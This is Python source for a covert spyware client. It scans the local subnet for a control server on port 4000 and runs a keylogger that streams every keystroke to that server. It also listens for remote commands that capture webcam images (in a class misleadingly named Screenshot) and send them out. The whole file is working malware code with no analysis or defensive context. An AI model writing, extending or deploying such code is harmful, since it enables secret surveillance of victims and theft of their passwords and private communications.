import socket
import cv2
import threading
import keyboard
from threading import Timer
from datetime import datetime

#SERVER_HOST = "192.168.0.8" 
#SERVER_HOST = "172.20.10.3" 

SERVER_HOST = ""

def get_ip_address():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address


print(f"Client IP Address: {get_ip_address()}")

SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128 

s = socket.socket()
#s.connect((SERVER_HOST, SERVER_PORT))

connected = False
client_ip = get_ip_address()
ip_base = '.'.join(client_ip.split('.')[:-1])

for i in range(1, 256):
    try:
        s.connect((f"{ip_base}.{i}", SERVER_PORT))
        print(f"Connected to {ip_base}.{i}")
        connected = True
        break
    except socket.error:
        print(f"Unable to connect to {ip_base}.{i}")
        continue

if not connected:
    print("Unable to connect to any IP address in the range.")


class Command:
    def __init__(self):
        self.command = None

    def receive(self):
        self.command = s.recv(BUFFER_SIZE).decode()
        return self.command

    def execute(self):
        print("Waiting for commands")
        while True:
            self.receive()
            if self.command == "screenshot":
                print("Taking screenshot")
                screenshot = Screenshot()
                screenshot.start()  
            elif self.command == "exit":
                s.close()
                break

class Screenshot:
    def __init__(self):
        self.screenshot = None

    def take_screenshot(self):
        self.screenshot = cv2.VideoCapture(0)
        ret, frame = self.screenshot.read()
        if ret:
            _, img_encoded = cv2.imencode(".jpg", frame)
            return img_encoded.tobytes()
        return None

    def start(self):
        screenshot = self.take_screenshot()
        if screenshot:

            s.sendall("image".encode())
            s.recv(1024)  
            s.sendall(f"{len(screenshot)}".encode())
            s.recv(1024)
            s.sendall(screenshot)
        self.screenshot.release()
        cv2.destroyAllWindows()

class Keylogger:
    def __init__(self, interval, server_socket, report_method="file"):
        self.interval = interval
        self.log = ""
        self.server_socket = server_socket

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":name = " "
            elif name == "enter":name = "[ENTER]\n"
            elif name == "decimal": name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        self.log += name
        self.send_keypress(name)
    def send_keypress(self, keypress):
            self.server_socket.sendall(keypress.encode())
    def start(self):
        keyboard.on_release(callback=self.callback)
        keyboard.wait()
command = Command()
command_thread = threading.Thread(target=command.execute)
command_thread.start()
keylogger = Keylogger(interval=5, server_socket=s)
keylogger_thread = threading.Thread(target=keylogger.start)
keylogger_thread.start()
